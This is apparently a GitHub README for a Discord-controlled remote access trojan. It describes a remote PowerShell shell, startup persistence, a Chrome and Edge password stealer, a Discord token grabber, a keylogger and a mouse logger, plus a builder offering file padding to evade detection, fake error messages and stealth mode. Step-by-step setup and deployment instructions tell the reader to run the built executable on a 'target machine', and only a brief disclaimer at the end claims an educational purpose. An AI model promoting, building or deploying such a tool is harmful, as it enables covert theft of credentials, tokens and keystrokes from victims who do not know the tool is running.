<p align="center">
  <img src="https://github.com/user-attachments/assets/e6255c6b-cd7c-44ca-b000-58f024e307b0" alt="twxerzzWare Logo" width="200">
</p>

<h1 align="center">twxerzzWare 🐀</h1>

<p align="center">
  A powerful Remote Administration Tool (RAT) controlled via Discord, featuring an advanced configuration builder.
</p>

---

## 🚀 Features

### 💻 System Control
- **Remote Shell**: Execute PowerShell commands directly from Discord.
- **Screen Control**: Turn off the victim's monitor or lock their peripherals.
- **Startup Persistence**: Automatically copies itself to the Windows startup folder.
- **Wallpaper Changer**: Change the desktop background via URL or attachment.
- **Text-to-Speech**: Play custom voice messages on the target PC.
- **Website Opener**: Open any URL in the default browser.

### 🕵️ Data Extraction
- **File Manager**: Upload and download files/folders (auto-zipping for large items).
- **Screenshot**: Capture high-quality screenshots of the current desktop.
- **Password Stealer**: Extract saved passwords from Microsoft Edge and Google Chrome.
- **Discord Token Grabber**: Retrieve Discord authentication tokens.
- **Browser History**: Fetch complete history from installed browsers.
- **IP Info**: Get detailed geolocation and network information of the victim.

### ⌨️ Monitoring
- **Keylogger**: Stealthy keystroke recording.
- **Mouse Logger**: Tracks mouse clicks and positions.
- **Activity Logs**: Remotely retrieve or clear monitoring logs.

---

## 🎮 Commands Showcase
<p align="center">
  <img width="549" height="648" alt="commands_showcase" src="https://github.com/user-attachments/assets/a0ccb429-736a-4cf7-b7aa-8236aad0d782" />
</p>

---

## 🛠 Builder Features
The project includes a dedicated **Builder** (EXE and BAT versions) that allows you to:
- **Configure Bot Token**: Bind the client to your Discord bot.
- **Custom Icon**: Select any `.ico` file for the generated client.
- **File Padding**: Increase the file size (up to 1GB) to bypass certain detections.
- **Fake Error**: Display a customizable crash/error message when the file is opened.
- **Stealth Mode**: Toggle whether the client hides its console and runs in the background.

---

## 📋 Requirements
- **Python 3.10+** (Recommended)
- **Discord Bot Token** (with `Message Content` and `Server Members` intents enabled)
- **Dependencies**:
  ```bash
  pip install discord.py requests pyautogui pynput pycryptodome pyttsx3 browser-history pywin32
  ```

---

## 📖 Usage

### 1. Setup Discord Bot
1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
2. Create a new application and add a bot.
3. Enable **all Intents** (especially Message Content).
4. Copy the **Bot Token**.

### 2. Build the Client
1. Run `builder.bat` or `builder.exe`.
2. Provide your Bot Token and customize the settings (Icon, Fake Error, etc.).
3. The builder will generate `kk_built.exe`.

### 3. Deploy & Control
1. Run the `kk_built.exe` on the target machine.
2. The machine will automatically create a private channel in your Discord server named after its hostname.
3. Use `!help` in that channel to see all available commands.

---

## ⚠️ Disclaimer
This tool is for educational purposes and authorized security testing only. Using this tool on machines you do not own or have explicit permission to test is illegal and unethical. The developer is not responsible for any misuse.
